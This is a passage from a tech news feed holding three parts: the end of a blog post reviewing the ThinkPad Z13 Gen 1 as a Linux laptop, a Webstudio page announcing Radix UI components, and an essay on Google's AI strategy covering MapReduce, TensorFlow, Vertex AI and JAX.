compatible.<ul><li>Linux pre-installed to demonstrate Linux is fully supported</li></ul></li><li>Full working day battery life; ~8 hours in my opinion.</li><li>Low-power CPU, 35W or under<ul><li>Ideally AMD 6000 series but a 12th Gen Intel as a compromise</li><li>No 11th Gen Intel or AMD 5000 series CPUs will be considered</li></ul></li><li>64GB RAM, will compromise on 32GB RAM</li><li>13" or 14" 1920x1200 matte display<ul><li>No UHD resolutions display will be considered (for power-saving reasons)</li><li>Touch support is a nice-to-have, but not essential</li><li>1920x1080 as a compromise, but nothing lower</li></ul></li><li>No discrete GPU. Again for power-saving reasons.</li><li>USB-C charging</li><li>Dual NVME SSD, or at least a single 2TB (or more) SSD</li><li>Decent keyboard and touchpad</li><li>The Laptop should weigh close to 1kg</li><li>Premium build quality and design (somewhat subjective I know)</li></ul><p>With this list of requirements established, I <a href="https://docs.google.com/spreadsheets/d/1kaB1pxbbYa1ebxeDRTguQ9EZol1EhM-0FE45Da8AOn8/edit#gid=0">started collating Linux laptop comparison notes in this somewhat idiosyncratic spreadsheet</a></p><p><a href="https://docs.google.com/spreadsheets/d/1kaB1pxbbYa1ebxeDRTguQ9EZol1EhM-0FE45Da8AOn8/edit#gid=0" target="_blank"><img src="https://wimpysworld.com/posts/why-i-chose-the-thinkpad-z13-as-my-linux-laptop/spreadsheet.webp" alt="Linux Laptop Comparison Spreadsheet"></a><br><em>A spreadsheet that probably only makes sense to me</em></p><p>Looking at the list of laptops in the sheet above, you might be wondering why I didn’t consider any laptops from the established dedicated Linux laptop vendors such as <a href="https://www.entroware.com/store/">Entroware</a>, <a href="https://slimbook.es/">Slimbook</a> and <a href="https://starlabs.systems/">StarLabs</a>. Well, I did look at everything they offered at the time and none of them had a model available that met the requirements I’ve outlined above or the estimated dispatch time was nearly half a year.</p><p>I’m not going to elaborate on the rationale behind ruling certain laptop models in or out, but I will say this; I was very impressed to see <a href="http://lenovo.com/linux"><strong>every laptop in the Lenovo ThinkPad lineup had a Linux pre-install option</strong></a> of either <a href="https://ubuntu.com/">Ubuntu</a> or <a href="https://getfedora.org/">Fedora</a> in “Build YourPC” system configurator. While comparing the power requirements of Intel’s i7-12xx series and AMD’s 68x0 series CPU at the time, I was sold on the impressive battery endurance of AMD’s offerings and the superior integrated graphics, so I excluded any laptop with Intel CPUs quite early on.</p><h2 id="lenovo-thinkpad-z13-gen-1-with-ubuntu-pre-installed">Lenovo ThinkPad Z13 Gen 1 with Ubuntu pre-installed</h2><p>I went with the <a href="https://www.lenovo.com/gb/en/p/laptops/thinkpad/thinkpadz/thinkpad-z13-(13-inch-amd)/21d2cto1wwgb1">ThinkPad Z13 Gen 1</a> with Ubuntu pre-installed, and the <a href="https://www.lenovo.com/gb/en/p/laptops/thinkpad/thinkpadt/thinkpad-t14s-gen-3-(14-inch-amd)/len101t0015">ThinkPad T14s Gen 3</a> was runner-up in my selection process.</p><h3 id="specifications-">Specifications 📝</h3><p>The key specifications for the laptop I ordered are AMD Ryzen 7 PRO 6850U CPU, 32 GB LPDDR5-6400MHz (Soldered), 1 TB SSD M.2 2242 PCIe Gen4, 13.3" WUXGA (1920 x 1200), IPS, Anti-Glare, Non-Touch display weighing in at 1.19kg. I think this configuration hits the sweet spot for battery endurance, more on that later.</p><p>I’m not a fan of the increasing trend of soldering RAM on motherboards, but that was common across all the models of laptops I was considering. If <a href="https://frame.work/gb/en">Framework</a> had offered an AMD 6000 series CPU option at the time, I would’ve had a Framework laptop on my short list as the modular design of the Framework laptops is very appealing.</p><p>And yes, I did make a compromise with the laptop specifications; that 1TB M.2 SSD is below my minimum requirement of 2TB. I did do my homework though and will present my creative upgrade solution in a future blog post. <a href="https://wimpysworld.com/posts/rss.xml">Like and Subscribe</a> 😉</p><h3 id="build-quality--design-">Build Quality &amp; Design 💻️</h3><p>Without a doubt, the ThinkPad Z13 Gen 1 is a gorgeous laptop. I do not have enough superlatives to express just how much I love it. It is, in my option, an almost flawless design. Exactly the compact form factor laptop I was seeking; it’s beautiful to look at from any angle and a delight to use. Here are some highlights.</p><p><img src="https://wimpysworld.com/posts/why-i-chose-the-thinkpad-z13-as-my-linux-laptop/ThinkPad_Z13_Gen_1_CT1_02.webp" alt="ThinkPad Z13 Gen 1"><br><em>ThinkPad Z13 Gen 1</em></p><p>The laptop is engineered from 75% recycled aluminium and 95% recycled plastics, then boxed in 100% renewable, compostable packaging. The touchpad is sublime and amazingly 120mm wide on the compact laptop. The haptic touch is simply excellent. The touchpad is the most Macbook-like touchpad I’ve used on any PC and it is so good it has caused me to change what desktop environment I now use. More on this in a future blog post. However, there is currently no Linux software to <a href="https://psref.lenovo.com/syspool/Sys/PDF/datasheet/ThinkPad_Z_Series_Haptic_TouchPad_Settings.pdf">configure the haptic touchpad settings</a> such as click force and touchpad feedback intensity but I’ve been perfectly happy with the defaults. If you do dual boot Windows the haptic settings configured via Windows are stored on the device and carry over to Linux.</p><p>The Keyboard is an excellent low-profile design, each key has ~1.2mm of travel which is the same as the actuation point on my Razer Huntsman V2 TKL keyboards with opto-mechanical switches. Most importantly the Fn key is in the correct place on the Z13 and not where ThinkPads have been incorrectly plonking it for years. Fight me! 🥊 If you are a long-time ThinkPad owner, it is likely you’ll hate the idea of the keyboard and touchpad on the Z13 since it is quite a departure from the traditional design. But I went into this with my eyes 👀 open and have watched and read many reviews.</p><p><img src="https://wimpysworld.com/posts/why-i-chose-the-thinkpad-z13-as-my-linux-laptop/ThinkPad_Z13_Gen_1_CT4_01.webp" alt="Correct Fn key placement on ThinkPad Z13 Gen 1"><br><em>"This is the way"</em></p><p>The Display is bright (400nits), anti-reflective and anti-smudge, covers 100% of the sRGB colour gamut and the laptop is perfectly balanced so it can be opened one-handed. I’m embracing the compact, thin and light lifestyle; so the two USB-C ports are fine with me as I’ve chosen a laptop configuration with excellent battery endurance (more on that in a bit) and plan to use it completely untethered most of the time with cables and adapters only plugged in for very specific tasks and overnight recharging.</p><p>I do have one niggle though; there is an unusable 2242 M.2 slot on the motherboard. It is only intended for use with select models of WWAN cards, none of which are a configuration option for the UK models of the Z13. It doesn’t look like the antenna is wired in either, so even if you do get a supported WWAN card aftermarket it is unlikely to work well; if at all. I can share my iPhone’s mobile service via Wifi, so not a deal breaker in that regard but it is rather annoying to have an M.2 slot on the motherboard and nothing I can do with it.</p><h3 id="ubuntu-pre-install-experience-">Ubuntu pre-install experience 👌</h3><p>It is worth noting that at the time of purchase, selecting Ubuntu or Fedora in the system configuration on the Lenovo website applied a £155 discount! 🤑 Choosing Ubuntu or Fedora across the ThinkPad line applies a discount, although the amount varies based on the model.</p><p>All OEMs that partner with Ubuntu get an OEM designation for each device officially endorsed and supported by Canonical. The ThinkPad Z13 Gen 1 is known as <em>Sutton Newell Abe</em> and the <code>oem-sutton.newell-abe-meta</code> package (along with the associated OEM PPA) provides the device-specific hardware enablement and power management tuning.</p><p><img src="https://wimpysworld.com/posts/why-i-chose-the-thinkpad-z13-as-my-linux-laptop/oem-name.webp" alt="ThinkPad Z13 Gen 1 (Sutton Newell Abe)"><br><em>ThinkPad Z13 Gen 1 is known as Sutton Newell Abe for OEM enablement</em></p><p>The OEM image of Ubuntu differs from the standard Ubuntu image in a few ways. The most obvious is that OEM image comes with recovery media creation pre-installed. This is a great feature and I highly recommend you use it to create a recovery USB stick, either during the initial setup or post-setup. The OEM image also comes with Chromium and Firefox installed, as opposed to just Firefox in the downloadable release of Ubuntu. IIRC, this is because Chromium has traditionally worked better with touchscreen laptops. The fingerprint reader works. I was able to enrol fingerprints quickly and authenticate GDM logins. But the biometric support does not extend throughout the system; Ubuntu Software doesn’t integrate with the fingerprint reader, nor does <code>snapd</code> or any other privilege escalation.</p><p>I also experienced the touchpad becoming unresponsive, requiring a click to “unfreeze” it. This happens quite frequently and detracts from what is otherwise an excellent, class-leading, touchpad. I suspect it is overly aggressive power management settings in the OEM image, but I didn’t investigate beyond that hunch. Both these issues with the fingerprint reader and touchpad are Ubuntu-specific and nothing related to the actual hardware. Both issues are absent when running NixOS.</p><p>Having a tier-1 vendor such as Lenovo ship a laptop with Ubuntu pre-installed has the benefit of great firmware support. I’ve received several firmware updates since I got the laptop, and they have all applied without issue.</p><p><img src="https://wimpysworld.com/posts/why-i-chose-the-thinkpad-z13-as-my-linux-laptop/firmware-update.webp" alt="ThinkPad Z13 Gen 1 firmware updates on Ubuntu"><br><em>Firmware updates for the ThinkPad Z13 Gen 1 on Ubuntu 20.04</em></p><h4 id="why-not-ubuntu-2204-">Why not Ubuntu 22.04? 🤔</h4><p>My Z13 was shipped with Ubuntu 20.04.4 with OEM optimised Linux kernel 5.14.0-1054-oem. Some might be perplexed (or annoyed) that it didn’t come with Ubuntu 22.04, given it was ordered in late 2022. I used to work for Canonical, and during that time worked with Lenovo to enable Ubuntu on ~60 of their laptops and workstations between 2019 and 2021, so I do have some insight into how this process works. It simply boils down to how the factory image certification process works, and once an image is qualified that is what ships on the device for the duration of its availability. Re-certification adds cost and takes time, so it’s extremely rare for a device to have a revised factory image qualified once it has gone on sale.</p><p>Upgrading to Ubuntu 22.04 LTS worked flawlessly, full audio support was restored and no other hardware supported regressed. Brilliant.</p><h4 id="linux-kernel-61-">Linux Kernel 6.1 🌰</h4><p>The pre-installed Ubuntu and Fedora images for the Z13 come with kernels that have backported patches applied to fully support the device. If you buy a ThinkPad Z13 and plan to run another Linux distro on it, make sure you can install Linux kernel version 6.1 or newer. This is to ensure the Qualcomm Wi-Fi 6E NFA725A 2x2 AX chipset is fully supported and that the required patches to properly suspend and resume are available.</p><h3 id="battery-endurance-">Battery endurance 🔋</h3><p>This is, after all, my most important selection criteria. The conclusion here is simple: <strong>11 hours</strong> ⏱️</p><p>This is 11 hours of mixed-use. Coding in Visual Studio Code. Chatting in Slack and Discord. Video calls in Google Meet and Zoom. Compiling software. Some screen capture with OBS Studio and basic video editing with <a href="https://shotcut.org/">Shotcut</a>. Closing the lid of the laptop and leaving it suspended for 24 hours depletes the battery by ~4% which is about 2 Wh. Very respectable. I haven’t felt the need to profile power consumption or tweak anything as I’m get plenty of untethered compute time. I’m very happy with the battery life, typically charging the laptop overnight while I sleep and running it all day battery only.</p><h2 id="whats-next-">What’s next? 🔮</h2><p>As noted, I did compromise on the 1TB M.2 SSD. I’ve come up with an aftermarket solution to upgrade to 2TB which I will post about soon. I chose a laptop pre-installed with Linux for two reasons:</p><ul><li>Support companies shipping a Linux operating system pre-installed on their laptops and workstations</li><li>Hard proof Linux works on their hardware</li></ul><p>After using Ubuntu for a few weeks I switched to NixOS. I will be posting about my experience with NixOS on the Z13 in a future blog post and <a href="https://twitch.tv/WimpysWorld">will likely livestream about it on Twitch</a> as well. TL;DR NixOS 22.11 has fewer issues than Ubuntu 22.04 on the ThinkPad Z13 Gen 1.</p><p>The ThinkPad Z13 Gen 1 is an excellent laptop for my requirements, and I have no regrets. If I were to buy I laptop pre-installed with a Linux distro in the future, I might go for Fedora, just so I can see what the OEM experience is like with Fedora.</p><p>Since I purchased the Z13, <a href="https://frame.work/gb/en/blog/framework-laptop-13-with-13th-gen-intel-core-and-amd-ryzen-7040-series">Framework has announced AMD 7040-series powered laptops</a> are coming later in 2023; and I’m not sure I can resist…</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Webstudio: Open-source WYSIWYG adds Radix UI elements (115 pts)]]></title>
            <link>https://webstudio.is/radix</link>
            <guid>37312523</guid>
            <pubDate>Tue, 29 Aug 2023 19:17:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://webstudio.is/radix">https://webstudio.is/radix</a>, See on <a href="https://news.ycombinator.com/item?id=37312523">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-ws-id="A90KV-H6l4EtPjGvDfmIb" data-ws-component="Box"><section data-ws-id="qPxsHRgrqNOUYL23JwkoZ" data-ws-component="Box"><p><img alt="Example navigation" data-ws-id="GLp-g6baVbhd2GatLwwYf" data-ws-component="Image" src="https://webstudio.is/cgi/image/Radix_Feature_1_JAEEfD_-59xDhumeZBODb.svg?width=3840&amp;quality=80&amp;format=auto" sizes="(min-width: 1280px) 50vw, 100vw" srcset="https://webstudio.is/cgi/image/Radix_Feature_1_JAEEfD_-59xDhumeZBODb.svg?width=384&amp;quality=80&amp;format=auto 384w, https://webstudio.is/cgi/image/Radix_Feature_1_JAEEfD_-59xDhumeZBODb.svg?width=640&amp;quality=80&amp;format=auto 640w, https://webstudio.is/cgi/image/Radix_Feature_1_JAEEfD_-59xDhumeZBODb.svg?width=750&amp;quality=80&amp;format=auto 750w, https://webstudio.is/cgi/image/Radix_Feature_1_JAEEfD_-59xDhumeZBODb.svg?width=828&amp;quality=80&amp;format=auto 828w, https://webstudio.is/cgi/image/Radix_Feature_1_JAEEfD_-59xDhumeZBODb.svg?width=1080&amp;quality=80&amp;format=auto 1080w, https://webstudio.is/cgi/image/Radix_Feature_1_JAEEfD_-59xDhumeZBODb.svg?width=1200&amp;quality=80&amp;format=auto 1200w, https://webstudio.is/cgi/image/Radix_Feature_1_JAEEfD_-59xDhumeZBODb.svg?width=1920&amp;quality=80&amp;format=auto 1920w, https://webstudio.is/cgi/image/Radix_Feature_1_JAEEfD_-59xDhumeZBODb.svg?width=2048&amp;quality=80&amp;format=auto 2048w, https://webstudio.is/cgi/image/Radix_Feature_1_JAEEfD_-59xDhumeZBODb.svg?width=3840&amp;quality=80&amp;format=auto 3840w" decoding="async" loading="lazy"></p><div data-ws-id="UuT__1n8EEjjY_DYbJOTj" data-ws-component="Box"><h2 data-ws-id="kiu-WHTXm3XySGARE9OmL" data-ws-component="Heading">Build advanced user interfaces</h2><p data-ws-id="PXdEy63pB8giS0zZJLaMn" data-ws-component="Paragraph">Design unique user interfaces with dropdowns, dialogs, forms, navigation menus, tooltips, and more. Simply drag, drop and style the <a href="https://www.radix-ui.com/primitives" target="_blank" data-ws-id="GHuvkPynGQqMCV2g1AwXN" data-ws-component="RichTextLink">Radix</a> component on your canvas, without writing any code.</p></div></section><section data-ws-id="OxykbtzhjIGKxOZJDwXa6" data-ws-component="Box"><p><img alt="Accessibility visualization" data-ws-id="_ggJVtGYujEQJ-E2AkVQW" data-ws-component="Image" src="https://webstudio.is/cgi/image/Radix_Feature_2_bcb1jwaF8jTNOc89B7rWc.svg?width=3840&amp;quality=80&amp;format=auto" sizes="(min-width: 1280px) 50vw, 100vw" srcset="https://webstudio.is/cgi/image/Radix_Feature_2_bcb1jwaF8jTNOc89B7rWc.svg?width=384&amp;quality=80&amp;format=auto 384w, https://webstudio.is/cgi/image/Radix_Feature_2_bcb1jwaF8jTNOc89B7rWc.svg?width=640&amp;quality=80&amp;format=auto 640w, https://webstudio.is/cgi/image/Radix_Feature_2_bcb1jwaF8jTNOc89B7rWc.svg?width=750&amp;quality=80&amp;format=auto 750w, https://webstudio.is/cgi/image/Radix_Feature_2_bcb1jwaF8jTNOc89B7rWc.svg?width=828&amp;quality=80&amp;format=auto 828w, https://webstudio.is/cgi/image/Radix_Feature_2_bcb1jwaF8jTNOc89B7rWc.svg?width=1080&amp;quality=80&amp;format=auto 1080w, https://webstudio.is/cgi/image/Radix_Feature_2_bcb1jwaF8jTNOc89B7rWc.svg?width=1200&amp;quality=80&amp;format=auto 1200w, https://webstudio.is/cgi/image/Radix_Feature_2_bcb1jwaF8jTNOc89B7rWc.svg?width=1920&amp;quality=80&amp;format=auto 1920w, https://webstudio.is/cgi/image/Radix_Feature_2_bcb1jwaF8jTNOc89B7rWc.svg?width=2048&amp;quality=80&amp;format=auto 2048w, https://webstudio.is/cgi/image/Radix_Feature_2_bcb1jwaF8jTNOc89B7rWc.svg?width=3840&amp;quality=80&amp;format=auto 3840w" decoding="async" loading="lazy"></p><div data-ws-id="sYSpZHO8lgzlp3NEPQqWo" data-ws-component="Box"><h2 data-ws-id="N6_UtgIddVKz4qDDcIZ__" data-ws-component="Heading">Accessible out of the box</h2><p data-ws-id="gJyjQFoZFsF5WNAOOhshd" data-ws-component="Paragraph">With built-in accessibility and <a href="https://www.w3.org/WAI/ARIA/apg/" data-ws-id="MxhrocaG_BJ3SYvAaTk8u" data-ws-component="RichTextLink">WAI-ARIA</a> specification, <a href="https://www.radix-ui.com/primitives" target="_blank" data-ws-id="WaRlx9thVl8eJFC71t97i" data-ws-component="RichTextLink">Radix UI</a> ensures that your designs are not only visually appealing but also accessible to all users, regardless of their abilities.</p></div></section><section data-ws-id="HhLrP84hMD-dxfemnxUEw" data-ws-component="Box"><p><img alt="Webstudio Components and code example" data-ws-id="gWQxTw_tfcrBjy4dFn2p8" data-ws-component="Image" src="https://webstudio.is/cgi/image/Radix_Feature_3_eoqAOesxoyohzxto346hk.svg?width=3840&amp;quality=80&amp;format=auto" sizes="(min-width: 1280px) 50vw, 100vw" srcset="https://webstudio.is/cgi/image/Radix_Feature_3_eoqAOesxoyohzxto346hk.svg?width=384&amp;quality=80&amp;format=auto 384w, https://webstudio.is/cgi/image/Radix_Feature_3_eoqAOesxoyohzxto346hk.svg?width=640&amp;quality=80&amp;format=auto 640w, https://webstudio.is/cgi/image/Radix_Feature_3_eoqAOesxoyohzxto346hk.svg?width=750&amp;quality=80&amp;format=auto 750w, https://webstudio.is/cgi/image/Radix_Feature_3_eoqAOesxoyohzxto346hk.svg?width=828&amp;quality=80&amp;format=auto 828w, https://webstudio.is/cgi/image/Radix_Feature_3_eoqAOesxoyohzxto346hk.svg?width=1080&amp;quality=80&amp;format=auto 1080w, https://webstudio.is/cgi/image/Radix_Feature_3_eoqAOesxoyohzxto346hk.svg?width=1200&amp;quality=80&amp;format=auto 1200w, https://webstudio.is/cgi/image/Radix_Feature_3_eoqAOesxoyohzxto346hk.svg?width=1920&amp;quality=80&amp;format=auto 1920w, https://webstudio.is/cgi/image/Radix_Feature_3_eoqAOesxoyohzxto346hk.svg?width=2048&amp;quality=80&amp;format=auto 2048w, https://webstudio.is/cgi/image/Radix_Feature_3_eoqAOesxoyohzxto346hk.svg?width=3840&amp;quality=80&amp;format=auto 3840w" decoding="async" loading="lazy"></p><div data-ws-id="BBLBWcSJoFf8KAS2g210A" data-ws-component="Box"><h2 data-ws-id="9hyTpvpcNWru2KZbcPbnp" data-ws-component="Heading">Developer superpowers for designers</h2><p data-ws-id="5ni4nZB40PTx8DGYPXOrg" data-ws-component="Paragraph">Radix UI simplifies the visual development process by handling accessibility details and complex logic, so you can focus on addressing unique design challenges.</p></div></section></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[MapReduce, TensorFlow, Vertex: Google's bet to avoid repeating history in AI (129 pts)]]></title>
            <link>https://www.supervised.news/p/mapreduce-tensorflow-bard-also-hello</link>
            <guid>37312385</guid>
            <pubDate>Tue, 29 Aug 2023 19:08:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.supervised.news/p/mapreduce-tensorflow-bard-also-hello">https://www.supervised.news/p/mapreduce-tensorflow-bard-also-hello</a>, See on <a href="https://news.ycombinator.com/item?id=37312385">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png" width="538" height="538" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/a83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1024,&quot;width&quot;:1024,&quot;resizeWidth&quot;:538,&quot;bytes&quot;:1321862,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png 1456w" sizes="100vw" fetchpriority="high"></picture></div></a><figcaption>a historian staring at a bookshelf, blade runner 2049 aesthetic, deep blue hue — midjourney</figcaption></figure></div><p>Google is in the middle of trying to avoid repeating history when releasing its industry-altering technology.</p><p><span>Transformers, the foundational technique behind modern AI, represents the risk of a </span><em>third</em><span> time Google has created a groundbreaking technique and let its competitors run off with the spoils. It happened in the early 2000s, with the release of the original MapReduce infrastructure. And it happened again with the release of TensorFlow, a framework that made deep learning more widely accessible and arguably triggered the first wave of modern machine learning, in 2015.</span></p><p>Its bid to avoid that with Transformers starts, more or less, today with its massive bet on its Google Cloud AI infrastructure Vertex AI. The company announced a large number of upgrades and the availability of many models—including Llama 2—to serve through its cloud infrastructure. </p><p>Google Cloud is at the core of its attempt to reclaim its title as the most powerful AI company on the planet, despite its constant series of missteps in the past years. But in conversations with developers and sources, Vertex AI has been one of the most confusing products Google has offered, from its branding to actual deployment in the field.</p><p>Vertex is now coalescing into its direct competitor with Azure AI studio and Amazon Bedrock by making multiple models available and serving a wide variety of use cases. Google is betting on its premiere experience and expertise in AI to face down Microsoft and Amazon in its first real fight for its life. At the same time it’s playing a complicated game of side chess against OpenAI to build a powerful foundation model and make it widely available with PaLM 2—and then eventually its multi-modal next-gen model Gemini.</p><p>And a subtle announcement with Nvidia on stage may signal another surprising—and critical—double-down to re-capture what it has ceded in TensorFlow. It comes in the form of a new language model development framework, PaxML, built on top of Google’s cutting-edge AI framework: JAX.</p><p>But we’ll get to that in a second. To better understand what’s at stake here for Google, let’s take a quick trip through some of its history of dropping the ball with its very first revolutionary technology, MapReduce.</p><p>Google has historically employed a mishmash of highly skilled scientists and engineers flanked by an army of product managers, designers, and others that have historically had only secondary authority to the company's technical talent.&nbsp;That’s changed over time, but Google has traditionally been considered an engineering-first organization.</p><p><span>This served the company&nbsp;</span><em>very</em><span>&nbsp;well for a very long time. Google's pioneering technology enabled it to crawl and index the entire Web into a single source of truth with Google Search. Most of Google's technical search achievements came on top of a computational breakthrough in its ability to manage massive amounts of data: MapReduce.</span></p><p><span>Jeff Dean, still currently at Google, and Sanjay Ghemawat in the early 2000s co-authored&nbsp;</span><a href="https://static.googleusercontent.com/media/research.google.com/en//archive/mapreduce-osdi04.pdf" rel="">a paper on the MapReduce</a><span> technique&nbsp;to efficiently create a framework for managing massive data sets—the kind Google needed for a search engine.&nbsp; Rather than make this available to the public, however, Google largely kept the technology in-house. </span></p><p>Run by engineers, the team essentially did not foresee the coming wave of open-source technology to power the modern Web and the companies that would come to commercialize it. It was the first of many unforced errors in its relationship with the open source developer community, as Doug Cutting and Mike Cafarella replicated the technology in 2006 in the form of Hadoop. That open source tool then became the general standard for managing large amounts of data, an enormous missed opportunity for Google.</p><p>Google's challenges continued with the release of TensorFlow, which once again became the de-facto standard in machine learning tools upon launch. It both enabled and inspired a new generation of AI-powered products and use cases. But it was missing many pieces that made it more developer-friendly and allowed Meta to swoop in with its own deep learning framework, PyTorch.</p><p>Google once again found itself caught flat-footed and quickly tried to tack on some of the features that made PyTorch popular (like eager execution). But it’s largely ceded its dominance in the developer community to PyTorch. While there are still many organizations using TensorFlow, PyTorch has captured the momentum of the machine learning developer community.</p><p>Eight Google alumni then released the Transformers paper in 2017, paving the way for modern generative AI that has since exploded since the public launch of ChatGPT. Transformers was widely considered a step change in AI, making the creation and deployment of large language models computationally feasible and practical.</p><p>The story should sound familiar at this point. Google let its dominance—at least for now—in AI slip through the cracks with OpenAI coming out with its GPT-series models up to GPT-3. And in November last year, the floodgates for AI opened up with the launch of ChatGPT and its successor, GPT-4.</p><p>It wasn’t just OpenAI either: Meta released a plenty-potent language model using the same technique pioneered by Google. Today it stands on the precipice of having missed the boat in AI with its rapid and clumsy releases of AI tools like Bard.</p><p>The final piece of Google’s strategy today came in the form of a subtle, and very vague, announcement from Nvidia CEO Jensen Huang on stage in a brief appearance of only a few minutes. Huang announced that Google and Nvidia had been collaborating with a new language model development framework, PaxML, built on top of Google’s cutting-edge machine learning framework JAX and its Accelerated Linear Algebra framework (or XLA).</p><p>“The work we’ve done to create frameworks that allow us to push the frontiers of models distributed across giant infrastructures to save time for AI researchers, scale up, save money, save energy—all that requires cutting edge computer science,” Huang said on stage.</p><p><span>JAX is a result of  of the company's dependency internally on TPUs and XLA—the latter of&nbsp;</span><a href="https://cloud.google.com/blog/products/ai-machine-learning/googles-open-source-momentum-openxla-new-partnerships" rel="">which was&nbsp;</a><em><a href="https://cloud.google.com/blog/products/ai-machine-learning/googles-open-source-momentum-openxla-new-partnerships" rel="">also</a></em><a href="https://cloud.google.com/blog/products/ai-machine-learning/googles-open-source-momentum-openxla-new-partnerships" rel="">&nbsp;open-sourced in October last year to relatively little fanfare</a><span>. It represents a tantalizing opportunity: the ability to efficiently distribute massive training tasks across a wide array of hardware in parallel in the middle of a hardware shortage and ballooning training costs.</span></p><p>While you’ll be hard pressed to find JAX in the wild, my understanding is a number of forward-thinking generative AI companies are using it. JAX represents the opportunity to rethink a training system from scratch and make it incredibly efficient. In particular, you could space out training across different types of hardware—hence the announcement with Huang on stage.</p><p><span>PaxML also represents a really interesting hedge for Nvidia. PyTorch is largely dependent on Cuda, Nvidia’s machine learning development framework, which has placed Nvidia on the throne for AI. Its NeMo and Triton represent a series of moves to lock into AI development workflows. There is already one large startup, </span><a href="https://www.modular.com/" rel="">Modular</a><span>, building a developer framework to break AI’s addiction to Cuda—</span><a href="https://www.reuters.com/technology/ai-startup-modular-raises-100-mln-general-catalyst-led-funding-2023-08-24/" rel="">and it recently raised at a $600 million valuation led by General Catalyst</a><span>.</span></p><p>Depending on how it plays out, PaxML could very easily be Google’s attempt to break JAX into the mainstream by way of Nvidia. Google already has a massive store of processing power with its TPU—and announced an updated one today—but has also made a big bet on Nvidia hardware by making H100 graphics hardware available on Google Cloud. PaxML represents an interesting opportunity to go to developers and say, hey, we can offer you a much larger amount of compute than AWS or Azure.</p><p>Google is now making its play in AI in the form of pushing Vertex AI into a competitive category with Azure (and by extension OpenAI) and AWS. And while it’s incredibly early, it’s possible its collaboration with Nvidia on PaxML could have pretty substantial ramifications for AI development as a whole.</p><p>We’re now just past the six-year anniversary of the release of the Transformers paper. TensorFlow launched in 2015, followed quickly by PyTorch. And it was roughly around that six-year mark—in 2021—that the class of modern machine learning infrastructure came about and raised at multi-billion dollar valuations. And they are, for the most part, PyTorch shops.</p><p>And we are starting to see requests for JAX experience alongside PyTorch in job descriptions. Some AI models, when released, come out with both PyTorch and JAX weights. It’s still incredibly early here, but there is a lot of opportunity—particularly with Nvidia throwing its weight behind JAX and XLA.</p><p>The largest user of TPUs has, historically, been Google itself as it now swaps JAX in to many of its foundational products. They’ve largely been freely available to Googlers as a perk internally, though my understanding is hardware constraints have made them more difficult to secure.</p><p><span>But a TPU, optimized for XLA and JAX, running in parallel to Nvidia GPUs on a widely available infrastructure powering </span><em>many</em><span> kinds of AI models in the form of Vertex AI, represents a very tantalizing opportunity for Google.</span></p><p>With Google clearing out its industry debt in the form of a more unified Vertex AI and a potential major bet on JAX, it stands to bring itself back into direct competition after spending the last year tripping over itself. We’ll now see if that’s enough to keep it from dropping the ball in AI for the third time.</p><p 